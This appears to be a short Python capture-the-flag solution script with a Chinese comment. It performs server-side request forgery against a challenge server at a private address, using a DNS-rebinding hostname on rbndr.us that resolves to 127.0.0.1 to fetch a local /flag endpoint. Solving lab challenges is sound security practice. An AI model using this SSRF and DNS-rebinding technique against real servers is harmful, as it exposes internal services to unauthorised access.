import requests

DNS="http://10.214.160.13:10011/"
urlpath="http://7f000001.6729a7ea.rbndr.us:9999/flag"

URL= DNS+urlpath
getresponse=requests.get(URL)
#getresponse接受的是向URL发送的http请求后的结果
if(getresponse.status_code==200):
        print(getresponse.text)